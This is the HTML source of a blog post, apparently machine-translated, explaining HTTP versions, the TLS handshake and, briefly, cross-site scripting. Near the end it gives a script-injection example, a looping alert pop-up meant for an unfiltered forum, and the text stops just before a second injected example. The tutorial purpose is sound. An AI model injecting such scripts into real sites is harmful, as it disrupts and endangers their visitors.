@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/en/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/en/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/en/images/favicon.ico">
+  <link rel="mask-icon" href="/en/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/en/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=PT Serif:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/en/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/en/lib/pace/pace-theme-minimal.min.css">
+  <script src="/en/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wizard-guido.github.io","root":"/en/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="title: HTTP &amp; Network Securitydate: 2021-12-06categories: Networktags: [HTTP]comments: falsesummary_img: … &#x2F;cover&#x2F;https.svg **This article focuses on some common computer networking concepts and">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Binary Vagabondage">
+<meta property="og:url" content="https://wizard-guido.github.io/en/2022/02/17/HTTP%20&%20Network/index.html">
+<meta property="og:site_name" content="Binary Vagabondage">
+<meta property="og:description" content="title: HTTP &amp; Network Securitydate: 2021-12-06categories: Networktags: [HTTP]comments: falsesummary_img: … &#x2F;cover&#x2F;https.svg **This article focuses on some common computer networking concepts and">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-17T21:53:25.941Z">
+<meta property="article:modified_time" content="2022-02-17T22:01:02.196Z">
+<meta property="article:author" content="Will">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://wizard-guido.github.io/en/2022/02/17/HTTP%20&%20Network/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+
+<script type="text/javascript">
+  // Wait for the page to load first
+  var _prevOnload = window.onload;
+  window.onload = function() {
+      var switchLang = document.getElementsByClassName("menu-item menu-item-switch_lang")[0];
+      switchLang.onclick = function() {
+          var href = window.location.href;
+          var indexOfEn = href.toLowerCase().indexOf('/en/');
+          if(indexOfEn !== -1) {
+              window.location.href = href.replace('/en/', '/');
+          }
+          else {
+              window.location.href = href.replace('.io', '.io/en');
+          }
+          if(typeof(_prevOnload) === 'function') {
+              _prevOnload();
+          }
+          return false;
+      }
+  }
+</script>
+  <title> | Binary Vagabondage</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/en/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Binary Vagabondage</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-switch_lang">
+
+    <a href="https://wizard-guido.github.io/" rel="section"><i class="fa fa-language fa-fw"></i>简体中文</a>
+
+  </li>
+        <li class="menu-item menu-item-home">
+
+    <a href="/en/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/en/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-training">
+
+    <a href="/en/training/" rel="section"><i class="fa fa-dumbbell fa-fw"></i>Training</a>
+
+  </li>
+        <li class="menu-item menu-item-photography">
+
+    <a href="/en/photography/" rel="section"><i class="fas fa-camera fa-fw"></i>Photography</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/en/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/Wizard-Guido?tab=repositories" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wizard-guido.github.io/en/2022/02/17/HTTP%20&%20Network/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/en/images/avatar.jpg">
+      <meta itemprop="name" content="Will">
+      <meta itemprop="description" content="This is a story about Binary Vagabondage...">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Binary Vagabondage">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-17 21:53:25 / Modified: 22:01:02" itemprop="dateCreated datePublished" datetime="2022-02-17T21:53:25+00:00">2022-02-17</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>17k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>15 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <hr>
+<p>title: HTTP &amp; Network Security<br>date: 2021-12-06<br>categories: Network<br>tags: [HTTP]<br>comments: false<br>summary_img: … /cover/https.svg</p>
+<p>**This article focuses on some common computer networking concepts and summarizes them for future in-depth understanding of web development. **</p>
+<p>&lt;! –more–&gt;</p>
+<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h2 id="HTTP-Protocol"><a href="#HTTP-Protocol" class="headerlink" title="HTTP Protocol"></a>HTTP Protocol</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>HTTP is a TCP/IP based <strong>application layer protocol</strong>. It does not involve the transmission of datagrams, but mainly specifies the format of communication between the client and the server, and uses port 80 by default.</p>
+<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h4><ul>
+<li><p>1996 - Released</p>
+</li>
+<li><p>Version 1.0 introduced the POST and HEAD commands in addition to the GET command, which was the only one available in version 0.9.</p>
+</li>
+<li><p>HTTP request and response formats, in addition to including <strong>data sections</strong> must also include <strong>header information i.e. HTTP HEADER</strong> (to describe metadata)</p>
+</li>
+</ul>
+<h4 id="request-format"><a href="#request-format" class="headerlink" title="request format"></a>request format</h4><p>Request command + multi-line headers</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 request command</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) Multi-line headers</span><br><span class="line">Accept: *&#x2F;* Multi-line headers</span><br></pre></td></tr></table></figure>
+<h4 id="Response-format"><a href="#Response-format" class="headerlink" title="Response format"></a>Response format</h4><p>Header + blank line + data. First line is protocol version + status code + status description</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK first line</span><br><span class="line">Content-Type: text&#x2F;plain from here onwards is the header</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											This is a blank line</span><br><span class="line">&lt;html&gt; Data from here onwards</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Content-Type-field"><a href="#Content-Type-field" class="headerlink" title="Content-Type field"></a>Content-Type field</h4><p>The headers are ASCII, but the data can be in any format. Therefore <strong><code>Content-Type</code> is needed to tell the client the format of this data</strong>.</p>
+<p>Common <code>Content-Type</code> field values are as follows.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
+<p>These data types are collectively known as <strong>MIME type</strong> and are in the format: primary type/secondary type.</p>
+<h4 id="Content-Encoding-field"><a href="#Content-Encoding-field" class="headerlink" title="Content-Encoding field"></a>Content-Encoding field</h4><p>As <strong>the data sent can be in any format</strong>, it is possible to compress the data before sending it. The <strong><code>Content-Encoding</code> field describes how the data is compressed</strong>. Common compression methods.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
+<p>Also** when the client requests**, it can specify the compression method it <strong>accepts</strong>, using the <strong>field <code>Accept-Encoding</code></strong>. as follows.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+<h4 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>The main problem with HTTP/1.0 is that: <strong>only one request can be sent per TCP connection</strong>. Once the data is sent, the link is closed. To request another resource, another TCP connection must be created. The TCP connection requires three handshakes between the client and the server, and starts off slowly due to slow start, making it costly to create a new TCP connection.</p>
+<p>** To solve this problem, some browsers use the non-standard field <code>Connection</code>. **</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<p>The above field requires the server not to close the TCP connection so that other requests can reuse it, and that reusable TCP connection will not be disconnected until either the client or the server actively closes it. However, this method is not standard.</p>
+<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>Used from 1997 to 201 several, until HTTPS.</p>
+<h4 id="Persistent-connections"><a href="#Persistent-connections" class="headerlink" title="Persistent connections"></a>Persistent connections</h4><ul>
+<li>The <strong>biggest change</strong> in version 1.1 was the introduction of <strong>persistent connection</strong>, i.e. TCP connections are not closed by default, can be reused by multiple requests and do not need to declare <code>Connection:keep-alive</code>.</li>
+<li>A connection is actively closed when there has been no communication between the client and the server for a period of time. However, the normative practice is for the client to send <code>Connection: close</code> on the last request, explicitly asking the server to close the TCP connection.</li>
+</ul>
+<p>**Note: **For the same domain name, most browsers allow <strong>6 persistent connections</strong> to be established at the same time.</p>
+<h4 id="Pipeline-mechanism"><a href="#Pipeline-mechanism" class="headerlink" title="Pipeline mechanism"></a>Pipeline mechanism</h4><p>In version 1.0, within the same TCP connection, if a client wanted to <strong>request two resources</strong>, it would <strong>send request A</strong> first, then wait for the server to respond, <strong>and then send request B</strong> after receiving the response**.</p>
+<p>In version 1.1 the <strong>pipelining</strong> mechanism was introduced, which allows the browser to <strong>send both an A request and a B request</strong>, but the server still responds to the A request first, in order, and then to the B request when it is done.</p>
+<p>Thus, the pipelining mechanism allows <strong>clients to send multiple requests</strong> at the same time over the same TCP connection.</p>
+<h4 id="Content-Length-field"><a href="#Content-Length-field" class="headerlink" title="Content-Length field"></a>Content-Length field</h4><p>** Used to declare the length of the data for this response. **</p>
+<h4 id="chunked-transfer-encoding"><a href="#chunked-transfer-encoding" class="headerlink" title="chunked-transfer-encoding"></a>chunked-transfer-encoding</h4><p>In short, it means that the server <strong>sends a piece of data as it is generated</strong>, i.e. it uses the stream mode instead of the buffer mode.</p>
+<p>Therefore, version 1.1 can use chunked transfer encoding instead of the <code>Content-Length</code> field. Whenever <strong>a request or response has a <code>Transfer-Encoding</code> field</strong> in its header, it indicates that the response will consist of an undetermined number of chunks of data.</p>
+<p><strong>Note:</strong> Each non-empty block of data will be preceded by a hexadecimal value to indicate the length of the block. It ends with a block of size 0, indicating that the data for this response has been sent. Examples are as follows.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<h4 id="Other-features"><a href="#Other-features" class="headerlink" title="Other features"></a>Other features</h4><ul>
+<li>Version 1.1 also adds many new verb methods such as <code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
+<li>A new <code>HOST</code> field** has been added to the client request headers to specify the server’s domain name. With the <code>HOST</code> field it is possible to send a request to a different website on the same server. (Laying the groundwork for the rise of virtual machines)</li>
+</ul>
+<h4 id="Disadvantages-1"><a href="#Disadvantages-1" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>There is <strong>Head-of-line blocking</strong>. Although multiplexing of TCP connections is allowed, data communication within the <strong>same TCP connection is still sequential</strong> and the server can only respond to the next request after processing the response to the first one. If the response to the previous request is slow, then there will be many requests queued up behind it.</p>
+<p>Ways to avoid queue head blocking are.</p>
+<ol>
+<li><strong>reduce the number of requests</strong>. For example, merging scripts and stylesheets, embedding images in CSS code</li>
+<li><strong>Multiple simultaneous persistent connections</strong>. For example, domain sharding, where the required downloads can come from multiple domains, can solve the concurrency limit.</li>
+</ol>
+<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="Binary-protocol"><a href="#Binary-protocol" class="headerlink" title="Binary protocol"></a>Binary protocol</h4><p>HTTP/1.1 has a text (ASCII) header and a text or binary data body. HTTP/2, however, is a <strong>thoroughly binary protocol</strong>, where both the header and the data body are binary, and are collectively referred to as “frames”: header frames and data frames.</p>
+<p>The advantage of the binary protocol is that additional frames can be defined.</p>
+<h4 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h4><p>In HTTP/2, both the client and the browser can send multiple requests and responses at the same time over the same TCP connection, without having to correspond to each other in order, thus avoiding the problem of queue head blocking.</p>
+<p>For example, in a TCP connection, the server receives both request A and request B. It responds to request A first, which turns out to be very time-consuming to process, so it sends the part of request A that has already been processed, then processes the response to request B, and when it’s done, it processes the rest of the request that sent A. We call this <strong>duplex, real-time communication</strong> <strong>multiplex</strong>.</p>
+<h4 id="data-flow"><a href="#data-flow" class="headerlink" title="data flow"></a>data flow</h4><p>In HTTP/2, <strong>packets are sent out of order</strong>; consecutive packets inside the same connection may belong to different responses, so it is necessary to <strong>mark</strong> the packet to indicate which response it belongs to.</p>
+<p>HTTP/2 refers to <strong>all packets</strong> of each request or response as a <strong>stream</strong>. Each stream is given a unique number. When a packet is sent, it must be marked with a stream ID that identifies which stream it belongs to. In addition, all stream IDs sent by the client are odd numbers and all stream IDs sent by the server are even numbers.</p>
+<p>When the stream is sent halfway, both the client and the server can signal the stream to be cancelled. In HTTP/1.1, the only way to cancel a stream was to close the TCP connection. HTTP/2 can cancel a request while ensuring that the TCP connection is still open and can be reused for other requests.</p>
+<p>The client can also specify the priority of the data stream, the higher the priority the sooner the server will respond to it.</p>
+<h4 id="header-compression"><a href="#header-compression" class="headerlink" title="header compression"></a>header compression</h4><p>As many fields in the <strong>request headers are repeated in each request</strong> (e.g. Cookie, User Agent, etc.), this can result in a lot of wasted bandwidth. HTTP/2 optimises this by introducing <strong>header compression</strong>. On the one hand, headers <strong>are compressed using methods such as <code>gzip</code></strong> before being sent; on the other hand, the client and server maintain a <strong>header table</strong> which is a mapping of <strong>fields and index numbers</strong>, after which only the index numbers are sent to improve speed.</p>
+<h4 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h4><p>HTTP/2 allows the server to send resources to the client unsolicited without receiving a request.</p>
+<p>For example, if a client requests a web page containing many static resources, the server will actively send these static resources to the client along with the web page, so that there is no need to wait for the client to receive the web page and parse the HTML to find static resources before requesting static resources.</p>
+<h2 id="HTTPS-Extra"><a href="#HTTPS-Extra" class="headerlink" title="HTTPS - Extra"></a>HTTPS - Extra</h2><p>The security of Internet communications is built on the <strong>SSL/TLS</strong> protocol.</p>
+<p><strong>Note</strong>: SSL - <strong>Secure Sockets Layer</strong>, TLS - an upgrade from SSL</p>
+<h3 id="Reasons-for-using-HTTPS-amp-what-it-does"><a href="#Reasons-for-using-HTTPS-amp-what-it-does" class="headerlink" title="Reasons for using HTTPS &amp; what it does"></a>Reasons for using HTTPS &amp; what it does</h3><p><strong>Comparison:</strong></p>
+<ul>
+<li><p>HTTP does not use SSL/TLS and is therefore unencrypted communication, all information is transmitted in clear text</p>
+<ol>
+<li><strong>Eavesdropping risk:</strong> third parties can intercept and be informed of the content of communications</li>
+<li><strong>tampering:</strong> third parties can intercept and modify the content of communications</li>
+<li><strong>pretending:</strong> a third party can impersonate another person to participate in the communication</li>
+</ol>
+</li>
+<li><p>Benefits of HTTPS based on SSL/TLS protocol</p>
+<ol>
+<li><strong>All messages are transmitted encrypted</strong> - no eavesdropping</li>
+<li><strong>with a checksum mechanism</strong> - any tampering with the content of the communication can be detected by both parties to the communication</li>
+<li><strong>Equipped with a certificate of identity</strong> - prevents identity impersonation</li>
+</ol>
+</li>
+</ul>
+<h3 id="The-basic-operation-of-the-SSL-TLS-protocol"><a href="#The-basic-operation-of-the-SSL-TLS-protocol" class="headerlink" title="The basic operation of the SSL/TLS protocol"></a>The basic operation of the SSL/TLS protocol</h3><p>The basic idea of the protocol is:** asymmetric encryption: public key encryption, private key decryption**. That is, the client first asks the server for the public key, then encrypts the message with the public key, and the server receives the ciphertext and decrypts it with its own private key.</p>
+<ol>
+<li><p><strong>How to ensure that the public key cannot be tampered with?</strong></p>
+<p>Answer: <strong>Put the public key into the digital certificate</strong>, as long as the certificate is trusted, then the public key is trusted.</p>
+</li>
+<li><p><strong>How to reduce the time required for encryption with a public key that is too computationally intensive?</strong></p>
+<p>Answer: For each conversation (session), the client and the server will generate a “conversation key” (session key), which will be used to encrypt the message. As the session key is a symmetric encryption, it is very fast, so if the server public key is only used to encrypt the session key itself, the time consumed for encryption is greatly reduced.</p>
+</li>
+</ol>
+<p>So, the basic process of the SSL/TLS protocol is</p>
+<ol>
+<li>the client requests and verifies the public key <strong>from the server</strong> - the handshake phase</li>
+<li>both parties negotiate <strong>to generate a “conversation key “</strong></li>
+<li>both parties use the “conversation key “ <strong>for encrypted communication</strong></li>
+</ol>
+<h3 id="Handshake-phase"><a href="#Handshake-phase" class="headerlink" title="Handshake phase"></a>Handshake phase</h3><p>The handshake phase involves four communications and all communications during this phase are in plaintext.</p>
+<h4 id="Phase-1-The-client-sends-a-request"><a href="#Phase-1-The-client-sends-a-request" class="headerlink" title="Phase 1: The client sends a request"></a>Phase 1: The client sends a request</h4><p>First, the client sends an encrypted communication request to the server. The request it sends is mainly about the following.</p>
+<ol>
+<li>the supported protocol version, e.g. TLS 1.0</li>
+<li>a random number generated by the client to be used later to generate a “conversation key”</li>
+<li>the encryption method supported, e.g. RSA public key encryption</li>
+<li>supported compression methods</li>
+</ol>
+<h4 id="Phase-2-Server-Response"><a href="#Phase-2-Server-Response" class="headerlink" title="Phase 2: Server Response"></a>Phase 2: Server Response</h4><p>The server receives a request from the client and sends a response to the client. The response mainly includes the following.</p>
+<ol>
+<li>confirmation of the version of the encrypted communication protocol used. If the two sides do not support the same version, the server will close this encrypted communication</li>
+<li>a random number generated by the server to be used later to generate the “conversation key”</li>
+<li>confirmation of the encryption method used</li>
+<li>the server certificate</li>
+</ol>
+<h4 id="Phase-3-Client-Response"><a href="#Phase-3-Client-Response" class="headerlink" title="Phase 3: Client Response"></a>Phase 3: Client Response</h4><p>When the client receives the response from the server, it first verifies the server’s digital certificate.</p>
+<p>If <strong>1. the certificate is not credible. 2. the domain name in the certificate does not match the actual domain name. 3. the certificate has expired</strong>, a warning is displayed to the visitor, giving him/her the option to continue the communication or not.</p>
+<p>If there is no problem with the certificate, the client will <strong>take the server’s public key</strong> from the certificate and send a response to the server with the following main contents.</p>
+<ol>
+<li>A random number generated by the client. The random number is encrypted with the public key to prevent eavesdropping.</li>
+<li>A notification of the change in encoding. Indicates that subsequent messages will be sent using the mutually agreed encryption method and key.</li>
+<li>client end of handshake notification. Indicates the end of the client’s handshake phase, this item is also the hash value of all content sent earlier and is used for server verification.</li>
+</ol>
+<p><strong>Note:</strong> The random number generated in this phase is the third random number (“pre-master key”) that appears throughout the handshake phase. With this, both the client and the server have three random numbers at the same time, and then each side generates the same “session key” for the session, using a pre-agreed encryption method.</p>
+<h4 id="Phase-4-Final-server-response"><a href="#Phase-4-Final-server-response" class="headerlink" title="Phase 4: Final server response"></a>Phase 4: Final server response</h4><p>Once the server has received the third random number, it calculates and generates the “session key” for the current session. A final response is then sent to the client. The main contents are as follows.</p>
+<ol>
+<li>Notification of code change. This indicates that the subsequent message will be sent with the agreed encryption method and key. 2.</li>
+<li>End of server handshake notification. Indicates that the handshake phase of the server has ended. This item is also the hash value of all the content sent earlier and is used for verification by the client.</li>
+</ol>
+<p>At this point, the entire handshake phase is complete. Next, the client and server communicate encrypted, which is <strong>exactly the same as the normal HTTP protocol</strong>, <strong>except that all sent content is encrypted using the “session key”</strong>.</p>
+<h2 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h2><h3 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS - Cross Site Scripting"></a>XSS - Cross Site Scripting</h3><h4 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h4><p>XSS, known as <strong>Cross-site scripting</strong>, or cross-site scripting in Chinese, is a type of <strong>attack</strong> on the security vulnerability of web applications, i.e. a type of <strong>code injection</strong>. This type of attack usually involves both HTML and user scripting languages (mainly JavaScript).</p>
+<p>For example, posting a malicious piece of JavaScript code on a web forum in JavaScript is a script injection, while at the same time if the content of this code has the ability to request an external server, then it is called XSS.</p>
+<p>Therefore, it can be understood as <strong>XSS (cross-site scripting) = script injection + the ability to request an external server</strong>.</p>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>For example, the following code is written for posting content in a forum site.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  while (true) &#123;</span><br><span class="line">    alert(&#x27;keep popping up windows&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Assuming the forum site has no filtering or other defence mechanisms, any user visiting this thread will have this pop-up popping up all the time in the client interface.</p>
+<p>**This is script injection in its simplest form. **Of course this script is not substantially more harmful then XSS is based on a script injection method to accomplish this, but it is injecting a script that contains a request for cross-site functionality.</p>
+<p>For example, in the forum site mentioned above, the following code is injected.</p>
